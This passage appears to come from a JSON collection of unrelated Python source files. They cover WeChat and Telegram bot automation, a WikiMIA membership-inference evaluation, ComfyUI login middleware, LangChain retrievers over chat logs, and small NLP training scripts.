\u5982\u679cat_name\u4e3a\u7a7a\u5219\u4ee3\u8868@\u6240\u6709\u4eba\r\n        if at_name == \"\":\r\n            auto.SendKeys(\"@{UP}{enter}\")\r\n            self.press_enter()\r\n        \r\n        else:\r\n            auto.SendKeys(f\"@{at_name}\")\r\n            # \u6309\u4e0b\u56de\u8f66\u952e\u786e\u8ba4\u8981at\u7684\u4eba\r\n            auto.SendKeys(\"{enter}\")\r\n            self.press_enter()\r\n    \r\n    # \u641c\u7d22\u6307\u5b9a\u7528\u6237\u540d\u7684\u8054\u7cfb\u4eba\u53d1\u9001\u4fe1\u606f\r\n    def send_msg(self, name, text):\r\n        self.get_contact(name)\r\n        pyperclip.copy(text)\r\n        auto.SendKeys(\"{Ctrl}v\")\r\n        self.press_enter()\r\n    \r\n    # \u641c\u7d22\u6307\u5b9a\u7528\u6237\u540d\u7684\u8054\u7cfb\u4eba\u53d1\u9001\u6587\u4ef6\r\n    def send_file(self, name: str, path: str):\r\n        \"\"\"\r\n        Args:\r\n            name: \u6307\u5b9a\u7528\u6237\u540d\u7684\u540d\u79f0\uff0c\u8f93\u5165\u641c\u7d22\u6846\u540e\u51fa\u73b0\u7684\u7b2c\u4e00\u4e2a\u4eba\r\n            path: \u53d1\u9001\u6587\u4ef6\u7684\u672c\u5730\u5730\u5740\r\n        \"\"\"\r\n        \r\n        # \u7c98\u8d34\u6587\u4ef6\u53d1\u9001\u7ed9\u7528\u6237\r\n        self.get_contact(name)\r\n        # \u5c06\u6587\u4ef6\u590d\u5236\u5230\u526a\u5207\u677f\r\n        setClipboardFiles([path])\r\n        \r\n        auto.SendKeys(\"{Ctrl}v\")\r\n        self.press_enter()\r\n    \r\n    # \u83b7\u53d6\u6240\u6709\u901a\u8baf\u5f55\u4e2d\u6240\u6709\u8054\u7cfb\u4eba\r\n    def find_all_contacts(self):\r\n        self.open_wechat()\r\n        self.get_wechat()\r\n        \r\n        # \u83b7\u53d6\u901a\u8baf\u5f55\u7ba1\u7406\u754c\u9762\r\n        click(auto.ButtonControl(Name=self.lc.contacts))\r\n        list_control = auto.ListControl(Name=self.lc.contact)\r\n        scroll_pattern = list_control.GetScrollPattern()\r\n        scroll_pattern.SetScrollPercent(-1, 0)\r\n        contacts_menu = list_control.ButtonControl(Name=self.lc.manage_contacts)\r\n        click(contacts_menu)\r\n        \r\n        # \u5207\u6362\u5230\u901a\u8baf\u5f55\u7ba1\u7406\u754c\u9762\r\n        contacts_window = auto.GetForegroundControl()\r\n        list_control = contacts_window.ListControl()\r\n        scroll_pattern = list_control.GetScrollPattern()\r\n        \r\n        # \u8bfb\u53d6\u7528\u6237\r\n        contacts = []\r\n        # \u5982\u679c\u4e0d\u5b58\u5728\u6ed1\u8f6e\u5219\u76f4\u63a5\u8bfb\u53d6\r\n        if scroll_pattern is None:\r\n            for contact in contacts_window.ListControl().GetChildren():\r\n                # \u83b7\u53d6\u7528\u6237\u7684\u6635\u79f0\u4ee5\u53ca\u5907\u6ce8\r\n                name = contact.TextControl().Name\r\n                note = contact.ButtonControl(foundIndex=2).Name\r\n\r\n                # \u6709\u5907\u6ce8\u7684\u7528\u5907\u6ce8\uff0c\u6ca1\u6709\u5907\u6ce8\u7684\u7528\u6635\u79f0\r\n                if note == \"\":\r\n                    contacts.append(name)\r\n                else:\r\n                    contacts.append(note)\r\n        else:\r\n            for percent in np.arange(0, 1.002, 0.001):\r\n                scroll_pattern.SetScrollPercent(-1, percent)\r\n                for contact in contacts_window.ListControl().GetChildren():\r\n      ",
    "import os, argparse\nfrom collections import defaultdict\nimport numpy as np\nimport pandas as pd\nfrom sklearn.metrics import roc_curve, auc\nfrom tqdm import tqdm\nimport zlib\n\nimport torch\nimport torch.nn.functional as F\n\nfrom transformers import AutoTokenizer, AutoModelForCausalLM\nfrom datasets import load_dataset\n\n\n# helper functions\ndef convert_huggingface_data_to_list_dic(dataset):\n    all_data = []\n    for i in range(len(dataset)):\n        ex = dataset[i]\n        all_data.append(ex)\n    return all_data\n\n# arguments\nparser = argparse.ArgumentParser()\nparser.add_argument('--model', type=str, default='EleutherAI/pythia-2.8b')\nparser.add_argument(\n    '--dataset', type=str, default='WikiMIA_length32', \n    choices=[\n        'WikiMIA_length32', 'WikiMIA_length64', 'WikiMIA_length128', \n        'WikiMIA_length32_paraphrased',\n        'WikiMIA_length64_paraphrased',\n        'WikiMIA_length128_paraphrased', \n    ]\n)\nparser.add_argument('--half', action='store_true')\nparser.add_argument('--int8', action='store_true')\nargs = parser.parse_args()\n\n# load model\ndef load_model(name):\n    int8_kwargs = {}\n    half_kwargs = {}\n    # ref model is small and will be loaded in full precision\n    if args.int8:\n        int8_kwargs = dict(load_in_8bit=True, torch_dtype=torch.bfloat16)\n    elif args.half:\n        half_kwargs = dict(torch_dtype=torch.bfloat16)\n    \n    if 'mamba' in name:\n        try:\n            from transformers import MambaForCausalLM\n        except ImportError:\n            raise ImportError\n        model = MambaForCausalLM.from_pretrained(\n            name, return_dict=True, device_map='auto', **int8_kwargs, **half_kwargs\n        )        \n    else:\n        model = AutoModelForCausalLM.from_pretrained(\n            name, return_dict=True, device_map='auto', **int8_kwargs, **half_kwargs\n        )\n    model.eval()\n    tokenizer = AutoTokenizer.from_pretrained(name)\n    return model, tokenizer\n\nmodel, tokenizer = load_model(args.model)\n\n# load dataset\nif not 'paraphrased' in args.dataset:\n    dataset = load_dataset('swj0419/WikiMIA', split=args.dataset)\nelse:\n    dataset = load_dataset('zjysteven/WikiMIA_paraphrased_perturbed', split=args.dataset)\ndata = convert_huggingface_data_to_list_dic(dataset)\n\nperturbed_dataset = load_dataset(\n    'zjysteven/WikiMIA_paraphrased_perturbed', \n    split=args.dataset + '_perturbed'\n)\nperturbed_data = convert_huggingface_data_to_list_dic(perturbed_dataset)\nnum_neighbors = len(perturbed_data) // len(data)\n\n# inference - get scores for each input\ndef inference(text, model):\n    input_ids = torch.tensor(tokenizer.encode(text)).unsqueeze(0)\n    input_ids = input_ids.to(model.device)\n    with torch.no_grad():\n        outputs = model(input_ids, labels=input_ids)\n    loss, logits = outputs[:2]\n    ll = -loss.item() # log-likelihood\n    return ll\n\nscores = defaultdict(list)\nfor i, d in enumerate(tqdm(data, total=len(data), desc='Samples')): \n    text = d['input']\n    ll = inference(text, model)\n\n    ll_neighbors = []\n    for j in range(num_neighbors):\n        text = perturbed_data[i * num_neighbors + j]['input']\n        ll_neighbors.append(inference(text, model))\n\n    # assuming the score is larger for training data\n    # and smaller for non-training data\n    # this is why sometimes there is a negative sign in front of the score\n    scores['neighbor'].append(ll - np.mean(ll_neighbors))\n\n# compute metrics\n# tpr and fpr thresholds are hard-coded\ndef get_metrics(scores, labels):\n    fpr_list, tpr_list, thresholds = roc_curve(labels, scores)\n    auroc = auc(fpr_list, tpr_list)\n    fpr95 = fpr_list[np.where(tpr_list >= 0.95)[0][0]]\n    tpr05 = tpr_list[np.where(fpr_list <= 0.05)[0][-1]]\n    return auroc, fpr95, tpr05\n\nlabels = [d['label'] for d in data] # 1: training, 0: non-training\nresults = defaultdict(list)\nfor method, scores in scores.items():\n    auroc, fpr95, tpr05 = get_metrics(scores, labels)\n    \n    results['method'].append(method)\n    results['auroc'].append(f\"{auroc:.1%}\")\n    results['fpr95'].append(f\"{fpr95:.1%}\")\n    results['tpr05'].append(f\"{tpr05:.1%}\")\n\ndf = pd.DataFrame(results)\nprint(df)\n\nsave_root = f\"results/{args.dataset}\"\nif not os.path.exists(save_root):\n    os.makedirs(save_root)\n\nmodel_id = args.model.split('/')[-1]\nif os.path.isfile(os.path.join(save_root, f\"{model_id}.csv\")):\n    df.to_csv(os.path.join(save_root, f\"{model_id}.csv\"), index=False, mode='a', header=False)\nelse:\n    df.to_csv(os.path.join(save_root, f\"{model_id}.csv\"), index=False)",
    "from pyrogram import Client, filters, enums\nfrom pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery\nfrom pyrogram.errors.exceptions.bad_request_400 import MessageTooLong, PeerIdInvalid\nfrom info import ADMINS, NEW_USER_LOG, SUPPORT_CHAT, MELCOW_NEW_USERS, MELCOW_VID, CHNL_LNK, GRP_LNK\nfrom database.users_chats_db import db\nfrom database.ia_filterdb import Media\nfrom utils import get_size, temp, get_settings\nfrom Script import script\nfrom pyrogram.errors import ChatAdminRequired\nimport asyncio \n@Client.on_message(filters.new_chat_members & filters.group)\nasync def save_group(bot, message):\n    r_j_check = [u.id for u in message.new_chat_members]\n    if temp.ME in r_j_check:\n        if not await db.get_chat(message.chat.id):\n            total=await bot.get_chat_members_count(message.chat.id)\n            r_j = message.from_user.mention if message.from_user else \"Anonymous\" \n            await bot.send_message(NEW_USER_LOG, script.LOG_TEXT_G.format(message.chat.title, message.chat.id, total, r_j))       \n            await db.add_chat(message.chat.id, message.chat.title)\n        if message.chat.id in temp.BANNED_CHATS:\n            # Inspired from a boat of a banana tree\n            buttons = [[\n                InlineKeyboardButton('Support', url=f'https://t.me/{SUPPORT_CHAT}')\n            ]]\n            reply_markup=InlineKeyboardMarkup(buttons)\n            k = await message.reply(\n                text='<b>CHAT NOT ALLOWED \ud83d\udc1e\\n\\nMy admins has restricted me from working here ! If you want to know more about it contact support..</b>',\n                reply_markup=reply_markup,\n            )\n\n            try:\n                await k.pin()\n            except:\n                pass\n            await bot.leave_chat(message.chat.id)\n            return\n        buttons = [[\n                    InlineKeyboardButton('S\u1d1c\u1d18\u1d18\u1d0f\u0280\u1d1b G\u0280\u1d0f\u1d1c\u1d18', url=GRP_LNK),\n                    InlineKeyboardButton('U\u1d18\u1d05\u1d00\u1d1b\u1d07s C\u029c\u1d00\u0274\u0274\u1d07\u029f', url=CHNL_LNK)\n                 ],[\n                    InlineKeyboardButton(\"B\u1d0f\u1d1b O\u1d21\u0274\u1d07\u0280\", url=\"https://t.me/Biisal\")\n                  ]]\n        reply_markup=InlineKeyboardMarkup(buttons)\n        await message.reply_text(\n            text=f\"<b>Thankyou For Adding Me In {message.chat.title} \u2763\ufe0f\\n\\nIf you have any questions & doubts about using me contact support.</b>\",\n            reply_markup=reply_markup)\n    else:\n        settings = await get_settings(message.chat.id)\n        if settings[\"welcome\"]:\n            for u in message.new_chat_members:\n                if (temp.MELCOW).get('welcome') is not None:\n                    try:\n                        await (temp.MELCOW['welcome']).delete()\n                    except:\n                        pass\n                temp.MELCOW['welcome'] = await message.reply_video(\n                                                 video=(MELCOW_VID),\n                                                 caption=(script.MELCOW_ENG.format(u.mention, message.chat.title)),\n                                                 reply_markup=InlineKeyboardMarkup(\n                                                                         [[\n                                                                           InlineKeyboardButton('S\u1d1c\u1d18\u1d18\u1d0f\u0280\u1d1b G\u0280\u1d0f\u1d1c\u1d18', url=GRP_LNK),\n                                                                           InlineKeyboardButton('U\u1d18\u1d05\u1d00\u1d1b\u1d07s C\u029c\u1d00\u0274\u0274\u1d07\u029f', url=CHNL_LNK)\n                                                                        ],[\n                                                                           InlineKeyboardButton(\"B\u1d0f\u1d1b O\u1d21\u0274\u1d07\u0280\", url=\"t.me/Biisal\")\n                                                                         ]]\n                                                 ),\n                                                 parse_mode=enums.ParseMode.HTML\n                )\n                \n        if settings[\"auto_delete\"]:\n            await asyncio.sleep(600)\n            await (temp.MELCOW['welcome']).delete()\n                \n               \n\n\n\n@Client.on_message(filters.command('leave') & filters.user(ADMINS))\nasync def leave_a_chat(bot, message):\n    if len(message.command) == 1:\n        return await message.reply('Give me a chat id')\n    chat = message.command[1]\n    try:\n        chat = int(chat)\n    except:\n        chat = chat\n    try:\n        buttons = [[\n            InlineKeyboardButton('Owner', url=\"https://t.me/Biisal\")\n        ],[\n            InlineKeyboardButton('Use Me Here', url=f'https://t.me/{SUPPORT_CHAT}')\n        ]]\n        reply_markup=InlineKeyboardMarkup(buttons)\n        await bot.send_message(\n            chat_id=chat,\n            text='<b>Hello Friends, \\n\u026a \u029f\u1d07\u0493\u1d1b \ud83d\ude1e \u1d1b\u029c\u1d07 \u0262\u0280\u1d0f\u1d1c\u1d18 \u0299\u1d07\u1d04\u1d00\u1d1cs\u1d07 \u026a\u1d1b \u1d05\u026a\u1d05n\\'t \u029c\u1d00\u1d20\u1d07 \u1d07\u0274\u1d0f\u1d1c\u0262\u029c \u1d0d\u1d07\u1d0d\u0299\u1d07\u0280s, \u1d00\u1d1b \u029f\u1d07\u1d00s\u1d1b 100 \u1d0d\u1d07\u1d0d\u0299\u1d07\u0280s.\\n\\nC\u1d0f\u0274\u1d1b\u1d00\u1d04\u1d1b \u1d1b\u1d0f \u1d0d\u028f \u1d0f\u1d21\u0274\u1d07\u0280 \u0493\u1d0f\u0280 s\u1d1c\u1d18\u1d18\u1d0f\u0280\u1d1b</b>',\n            reply_markup=reply_markup,\n        )\n\n        await bot.leave_chat(chat)\n        await message.reply(f\"left the chat `{chat}`\")\n    except Exception as e:\n        await message.reply(f'Error - {e}')\n\n@Client.on_message(filters.command",
    "import json\nimport os\nfrom tqdm import tqdm\nfrom concurrent.futures import ThreadPoolExecutor\nimport argparse\nfrom utils import get_prompt\nfrom openai import OpenAI\n\nMAX_API_RETRY = 5\nAPI_KEY = os.environ[\"OPENAI_API_KEY\"]\n\ndef get_response(query, prompt):\n    for _ in range(MAX_API_RETRY):\n        try:\n            client = OpenAI(api_key=API_KEY)\n            response = client.chat.completions.create(\n                model='gpt-4-turbo-preview',\n                max_tokens=1024,\n                top_p=0.8,\n                temperature=0.7,\n                messages=[{\n                    'role': 'user',\n                    'content': prompt,\n                }],\n            )\n            content = response.choices[0].message.content\n        except Exception as e:\n            print(f\"failed... {e}\")\n            continue\n        try:\n            if content.startswith(\"```json\"): # remove markdown, used for gpt-4 turbo\n                content = content[7:-3]\n            answer = json.loads(content)\n        except Exception as e:\n            print(f\"json failed to parse: {e}\")\n            print(f\"content: {content}\")\n            return None\n        return query, answer\n\ndef main(args):\n    # load input queries and output file\n    input_file = os.path.join(args.dir, \"selected_query.txt\")\n    input_queries = []\n    with open(input_file, \"r\") as f:\n        for line in f:\n            input_queries.append(line.strip())\n    \n    output_file = os.path.join(args.dir, \"01_reframed_questions.json\")\n    reframed_questions = {}\n    \n    # load prompt\n    prompt = get_prompt(\"question reframing\")\n\n    # load saved samples\n    dedup_set = set()\n    try:\n        with open(output_file, \"r\") as f:\n            reframed_questions = json.load(f)\n            dedup_set = set(reframed_questions.keys())\n    except:\n        pass\n\n    passed_args = []\n    for sample in input_queries:\n        if sample in dedup_set:\n            continue\n        passed_args.append((sample, prompt % sample))\n    \n    with ThreadPoolExecutor(max_workers=args.worker) as executor:\n        for save_count, future in enumerate(tqdm(executor.map(get_response, *zip(*passed_args)), total=len(passed_args))):\n            if future is not None:\n                query, ans = future\n                reframed_questions[query] = ans\n                if save_count % args.save_iterval == 0:\n                    with open(output_file, \"w\") as f:\n                        json.dump(reframed_questions, f, ensure_ascii=False, indent=4)\n                    print(f\"File Saved\")\n    \n    with open(output_file, \"w\") as f:\n        json.dump(reframed_questions, f, ensure_ascii=False, indent=4)\n    print(f\"File Saved\")\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--dir\", type=str, help=\"input file path for sentences\", default=\"conifer_data\")\n    parser.add_argument(\"--save-iterval\", type=int, help=\"save to file after generating K samples\", default=2)\n    parser.add_argument(\"--worker\", type=int, help=\"number of concurrent workers\", default=4)\n    args = parser.parse_args()\n    main(args)",
    "import server\nimport aiohttp\nfrom aiohttp_session import setup, get_session\nfrom aiohttp_session.cookie_storage import EncryptedCookieStorage\nfrom aiohttp import web\nimport base64\nimport os\nimport folder_paths\nimport bcrypt\nfrom datetime import datetime, timedelta\n\nnode_dir = os.path.dirname(__file__)\ncomfy_dir = os.path.dirname(folder_paths.__file__)\npassword_path = os.path.join(comfy_dir, \"PASSWORD\")\nsecret_key_path = os.path.join(node_dir,'.secret-key.txt')\nKEY_AGE_LIMIT = timedelta(days=30)  # Key expiration period\n\ndef generate_key():\n    return base64.urlsafe_b64encode(os.urandom(32)).decode('utf-8')\n\ndef write_key_to_file(key):\n    with open(secret_key_path, 'w') as file:\n        file.write(f\"{key},{datetime.now().isoformat()}\")\n\ndef read_key_from_file():\n    try:\n        with open(secret_key_path, 'r') as file:\n            key, timestamp = file.read().split(',')\n            return key, datetime.fromisoformat(timestamp)\n    except FileNotFoundError:\n        return None, None\n\ndef key_is_old(timestamp):\n    return datetime.now() - timestamp > KEY_AGE_LIMIT\n\ndef get_or_refresh_key():\n    key, timestamp = read_key_from_file()\n    if key is None or timestamp is None or key_is_old(timestamp):\n        key = generate_key()\n        write_key_to_file(key)\n    return key\n\n# Access the PromptServer instance and its app\nprompt_server = server.PromptServer.instance\napp = prompt_server.app\nroutes = prompt_server.routes\n\nsecret_key = get_or_refresh_key()\nsetup(app, EncryptedCookieStorage(secret_key))\n\n@routes.get(\"/login\")\nasync def get_root(request):\n    session = await get_session(request)\n    if ('logged_in' in session and session['logged_in']):\n        raise web.HTTPFound('/')\n    else:\n        return web.FileResponse(os.path.join(node_dir, \"login.html\"))\n\n# Add a route for \"/login\" that handles the form submission\n@routes.post(\"/login\")\nasync def login_handler(request):\n    data = await request.post()  # Get the data from the form\n    password = data.get('password').encode('utf-8')\n    if os.path.exists(password_path):\n        with open(password_path, \"rb\") as f:\n            hashed_password = f.read()\n        if bcrypt.checkpw(password, hashed_password):\n            session = await get_session(request)\n            session['logged_in'] = True\n            response = web.HTTPFound('/')  # Redirect to the main page if the password is correct\n            return response\n        else:\n            return web.HTTPFound('/login?feedback=Wrong password')\n    else:\n        salt = bcrypt.gensalt()\n        hashed_password = bcrypt.hashpw(password, salt)\n        # Write the hashed password to a file\n        with open(password_path, \"wb\") as file:\n            file.write(hashed_password)\n        session = await get_session(request)\n        session['logged_in'] = True\n        response = web.HTTPFound('/')  # Redirect to the main page if the password is correct\n        return response\n\n@routes.get(\"/logout\")\nasync def get_root(request):\n    session = await get_session(request)\n    session['logged_in'] = False\n    response = web.HTTPFound('/login')  # Redirect to the main page if the password is correct\n    return response\n\n# For loading all custom js\nWEB_DIRECTORY = \"js\"\n\n@web.middleware\nasync def check_login_status(request: web.Request, handler):\n    if request.path == '/login' or request.path.endswith('.css') or request.path.endswith('.js'):\n        # Skip for safe URIs\n        response = await handler(request)\n        return response\n    session = await get_session(request)\n    if ('logged_in' in session and session['logged_in']):\n        response = await handler(request)\n        if request.path == '/': # This avoids seeing the GUI after logging out and navigating back immediately.\n            response.headers.setdefault('Cache-Control', 'no-cache')\n        return response\n    raise web.HTTPFound('/login')\n\napp.middlewares.append(check_login_status)\n\nNODE_CLASS_MAPPINGS = {}\n",
    "from abc import ABC, abstractmethod\nfrom typing import List, Dict, Any\nfrom langchain_core.runnables import ConfigurableField\nfrom langchain_openai import ChatOpenAI\nfrom langchain.chains.query_constructor.base import AttributeInfo\nfrom langchain.retrievers.self_query.base import SelfQueryRetriever\n\nfrom langchain.retrievers import EnsembleRetriever\nfrom langchain_core.retrievers import BaseRetriever\n\n\nclass RetrieverFactory(ABC):\n    \"\"\"\n    \uae30\ubcf8 \uac80\uc0c9\uae30 \uc0dd\uc131\uc790 \ud074\ub798\uc2a4\uc785\ub2c8\ub2e4. \ubaa8\ub4e0 \uac80\uc0c9\uae30 \ud329\ud1a0\ub9ac\ub294 \uc774 \ud074\ub798\uc2a4\ub97c \uc0c1\uc18d\ubc1b\uc544\uc57c \ud569\ub2c8\ub2e4.\n    \"\"\"\n\n    def __init__(self, db: Any):\n        \"\"\"\n        \uac80\uc0c9\uae30 \ud329\ud1a0\ub9ac\ub97c \ucd08\uae30\ud654\ud569\ub2c8\ub2e4.\n\n        :param db: \ub370\uc774\ud130\ubca0\uc774\uc2a4 \uc778\uc2a4\ud134\uc2a4\n        \"\"\"\n        self.db = db\n\n    @abstractmethod\n    def create(self, **kwargs) -> BaseRetriever:\n        \"\"\"\n        \uac80\uc0c9\uae30 \uc778\uc2a4\ud134\uc2a4\ub97c \uc0dd\uc131\ud558\uace0 \ubc18\ud658\ud569\ub2c8\ub2e4. \ud30c\uc0dd \ud074\ub798\uc2a4\ub294 \uc774 \uba54\uc11c\ub4dc\ub97c \uad6c\ud604\ud574\uc57c \ud569\ub2c8\ub2e4.\n\n        :param kwargs: \uac80\uc0c9\uae30 \uc0dd\uc131\uc5d0 \ud544\uc694\ud55c \ucd94\uac00 \ub9e4\uac1c\ubcc0\uc218\n        :return: \uc0dd\uc131\ub41c \uac80\uc0c9\uae30 \uc778\uc2a4\ud134\uc2a4\n        \"\"\"\n        pass\n\n    def _configure_fields(\n        self,\n        retriever: BaseRetriever,\n        configurable_fields: Dict[str, ConfigurableField],\n    ) -> BaseRetriever:\n        \"\"\"\n        \uac80\uc0c9\uae30\uc5d0 \ub300\ud55c \uad6c\uc131 \uac00\ub2a5\ud55c \ud544\ub4dc\ub97c \uc124\uc815\ud569\ub2c8\ub2e4.\n\n        :param retriever: \uad6c\uc131\ud560 \uac80\uc0c9\uae30 \uc778\uc2a4\ud134\uc2a4\n        :param configurable_fields: \uad6c\uc131 \uac00\ub2a5\ud55c \ud544\ub4dc \ub515\uc154\ub108\ub9ac\n        :return: \uad6c\uc131\ub41c \uac80\uc0c9\uae30 \uc778\uc2a4\ud134\uc2a4\n        \"\"\"\n        for field_name, field_value in configurable_fields.items():\n            setattr(retriever, field_name, field_value)\n        return retriever\n\n\nclass FAISSRetrieverFactory(RetrieverFactory):\n    \"\"\"\n    FAISS \uae30\ubc18 \uac80\uc0c9\uae30 \uc0dd\uc131\uc790 \ud074\ub798\uc2a4\uc785\ub2c8\ub2e4.\n    \"\"\"\n\n    def create(self, **kwargs) -> BaseRetriever:\n        search_kwargs = kwargs.get(\"search_kwargs\", {\"k\": 30})\n        faiss_retriever = self.db.as_retriever(  # \uac80\uc0c9 \uc2dc \ubc18\ud658\ud560 \uacb0\uacfc\uc758 \uac1c\uc218\ub97c \uc124\uc815\ud569\ub2c8\ub2e4.\n            search_kwargs=search_kwargs\n        ).configurable_fields(\n            search_kwargs=ConfigurableField(\n                # \uac80\uc0c9 \ub9e4\uac1c\ubcc0\uc218\uc758 \uace0\uc720 \uc2dd\ubcc4\uc790\ub97c \uc124\uc815\ud569\ub2c8\ub2e4.\n                id=\"search_kwargs_faiss\",\n                # \uac80\uc0c9 \ub9e4\uac1c\ubcc0\uc218\uc758 \uc774\ub984\uc744 \uc124\uc815\ud569\ub2c8\ub2e4.\n                name=\"Search Kwargs\",\n                # \uac80\uc0c9 \ub9e4\uac1c\ubcc0\uc218\uc5d0 \ub300\ud55c \uc124\uba85\uc744 \uc791\uc131\ud569\ub2c8\ub2e4.\n                description=\"The search kwargs to use\",\n            )\n        )\n        return faiss_retriever\n\n\nclass SelfQueryRetrieverFactory(RetrieverFactory):\n    \"\"\"\n    SelfQuery \uac80\uc0c9\uae30 \uc0dd\uc131\uc790 \ud074\ub798\uc2a4\uc785\ub2c8\ub2e4.\n    \"\"\"\n\n    def create(self, **kwargs) -> BaseRetriever:\n        llm_for_selfquery = ChatOpenAI(\n            model=kwargs.get(\"model\", \"gpt-4-turbo-preview\"),\n            temperature=kwargs.get(\"temperature\", 0),\n            api_key=kwargs.get(\"api_key\", \"\"),\n        )\n        document_content_description = kwargs.get(\n            \"document_content_description\",\n            \"Information about each chat message in a KakaoTalk chat log.\",\n        )\n        metadata_field_info = kwargs.get(\n            \"metadata_field_info\",\n            [\n                AttributeInfo(\n                    name=\"year\",\n                    description=\"The year of the chat message was sent\",\n                    type=\"integer\",\n                ),\n                AttributeInfo(\n                    name=\"month\",\n                    description=\"The month of the chat message was sent\",\n                    type=\"integer\",\n                ),\n                AttributeInfo(\n                    name=\"day\",\n                    description=\"The day of the chat message was sent\",\n                    type=\"integer\",\n                ),\n                AttributeInfo(\n                    name=\"user\",\n                    description=\"The user who sent the message\",\n                    type=\"string\",\n                ),\n                AttributeInfo(\n                    name=\"row\",\n                    description=\"The row number in the original CSV file\",\n                    type=\"integer\",\n                ),\n                AttributeInfo(\n                    name=\"source\", description=\"File path of the source\", type=\"string\"\n                ),\n            ],\n        )\n\n        search_kwargs = kwargs.get(\"search_kwargs\", {\"k\": 30})\n        self_query_retriever = SelfQueryRetriever.from_llm(\n            llm_for_selfquery,\n            self.db,\n            document_content_description,\n            metadata_field_info,\n            search_kwargs=search_kwargs,\n        ).configurable_fields(\n            search_kwargs=ConfigurableField(\n                # \uac80\uc0c9 \ub9e4\uac1c\ubcc0\uc218\uc758 \uace0\uc720 \uc2dd\ubcc4\uc790\ub97c \uc124\uc815\ud569\ub2c8\ub2e4.\n                id=\"search_kwargs_selfquery\",\n                # \uac80\uc0c9 \ub9e4\uac1c\ubcc0\uc218\uc758 \uc774\ub984\uc744 \uc124\uc815\ud569\ub2c8\ub2e4.\n                name=\"Search Kwargs\",\n                # \uac80\uc0c9 \ub9e4\uac1c\ubcc0\uc218\uc5d0 \ub300\ud55c \uc124\uba85\uc744 \uc791\uc131\ud569\ub2c8\ub2e4.\n                description=\"The search kwargs to use\",\n            )\n        )\n        return self_query_retriever\n\n\nclass EnsembleRetrieverFactory(RetrieverFactory):\n    \"\"\"\n    \uc559\uc0c1\ube14 \uac80\uc0c9\uae30 \uc0dd\uc131\uc790 \ud074\ub798\uc2a4\uc785\ub2c8\ub2e4.\n    \"\"\"\n\n    def create(\n        self,\n        retrievers: List[BaseRetriever],\n        weights: List[float],\n        search_type: str = \"mmr\",\n        **kwargs\n    ) -> BaseRetriever:\n        if not retrievers or not weights or len(retrievers) != len(weights):\n            raise ValueError(\n                \"Retrievers and weights must be non-empty lists of equal length.\"\n            )\n\n        ensemble",
    "import json\nimport random\nimport pickle\nimport numpy as np\n\nimport nltk\n# nltk.download('punkt')\n# nltk.download('wordnet')\nfrom nltk.stem import WordNetLemmatizer\n\nfrom tensorflow.keras.models import Sequential\nfrom tensorflow.keras.layers import Dense, Activation, Dropout\nfrom tensorflow.keras.optimizers import SGD\n\nlemmatizer = WordNetLemmatizer()\n\nintents = json.loads(open('intents.json').read())\n\nwords = []\nlabels = []\ndocuments = []\nignore = ['?', '!', '.', ',']\n\nfor intent in intents['intents']:\n    for pattern in intent['patterns']:\n        word_list = nltk.word_tokenize(pattern)\n\n        words.extend(word_list)\n\n        documents.append((word_list, intent['tag']))\n        if intent['tag'] not in labels:\n            labels.append(intent['tag'])\n\nwords = [lemmatizer.lemmatize(w.lower()) for w in words if w not in ignore]  # edited\nwords = sorted(list(set(words)))\n\nlabels = sorted(list(set(labels)))\n\npickle.dump(words, open('words.pkl', 'wb'))\npickle.dump(labels, open('labels.pkl', 'wb'))\n\ntrain_set = []\noutput_empty = [0] * len(labels)\n\nfor doc in documents:\n    bag = []\n    word_patterns = doc[0]\n\n    word_patterns = [lemmatizer.lemmatize(word.lower()) for word in word_patterns]\n\n    for word in words:\n        bag.append(1) if word in word_patterns else bag.append(0)\n\n    output_row = list(output_empty)\n    output_row[labels.index(doc[1])] = 1\n    train_set.append([bag, output_row])\n\nrandom.shuffle(train_set)\ntrain_set = np.array(train_set)\n\ntrain_x = list(train_set[:, 0])\ntrain_y = list(train_set[:, 1])\n\nmodel = Sequential(\n    [\n        Dense(128, input_shape=(len(train_x[0]),), activation='relu'),\n        Dropout(0.5),\n        Dense(64, activation='relu'),\n        Dropout(0.5),\n        Dense(len(train_y[0]), activation='softmax')\n    ]\n)\n\nsgd = SGD(lr=0.01, decay=1e-6, momentum=0.9, nesterov=True)\nmodel.compile(loss='categorical_crossentropy', optimizer=sgd, metrics=['accuracy'])\n\nhist = model.fit(np.array(train_x), np.array(train_y), epochs=500, batch_size=5, verbose=1)\nmodel.save('chatbot_model.h5', hist)\nprint(\"Done\")\n",
    "from sentence_transformers import SentenceTransformer, util\nfrom dotenv import load_dotenv\nimport os\nimport torch\nimport json\n\nload_dotenv('.env')\n# Load Limit Score constant from env\nlimit_score = float(os.environ['LIMIT_SCORE'])\ninput_cn_file_path = os.environ['OUT_CN_FILE_PATH']\ninput_en_file_path = os.environ['OUT_EN_FILE_PATH']\nresult_file_path = os.environ['RESULT_JSON_FILE_PATH']\n\n# save model in current directory\nmodel = SentenceTransformer('paraphrase-multilingual-MiniLM-L12-v2', device='cpu', cache_folder='./')\n# save model in models folder (you need to create the folder on your own beforehand)\n# model = SentenceTransformer('paraphrase-multilingual-MiniLM-L12-v2', device='cpu', cache_folder='./models/')\nprint(\"Read Input Files ...\")\n# Read queries from file and split by line breaks\nwith open(input_en_file_path, \"r\", encoding='utf-8') as query_file:\n    queries = query_file.read().split(\"\\n\\n\")\n\n# Read corpus from file and split by line breaks\nwith open(input_cn_file_path, \"r\", encoding='utf-8') as corpus_file:\n    corpus = corpus_file.read().split(\"\\n\\n\")\n\n# print(corpus)\n\n\n# Corpus with example sentences\n# corpus = [\n#     'I am a boy',\n#     'What are you doing?',\n#     'Can you help me?',\n#     'A man is riding a horse.',\n#     'A woman is playing violin.',\n#     'A monkey is chasing after a goat',\n#     'The quick brown fox jumps over the lazy dog'\n# ]\n\n# Query sentences:\n# queries = ['\u4f60\u80fd\u5e6b\u52a9\u6211\u55ce\uff1f', '\u6211\u662f\u7537\u5b69\u5b50', '\u4e00\u500b\u5973\u4eba\u6b63\u5728\u62c9\u5c0f\u63d0\u7434']\nprint(\"Chinese model encoding by embedding ...\\n\")\n# corpus_embedding = model.encode(corpus, convert_to_tensor=True)\ntop_k = 1\nresults = []\nlen_query = len(queries)\nlen_corpus = len(corpus)\npitch = int(0.01 * len_corpus)\nprint(\"Loop of queries ...\")\nfor idx, query in enumerate(queries):\n    corpus_index = int( idx / len_query * len_corpus )\n\n    high_limit = len_corpus if len_corpus < corpus_index + pitch else corpus_index + pitch\n    low_limit = 0 if 0 > corpus_index - pitch else corpus_index - pitch\n    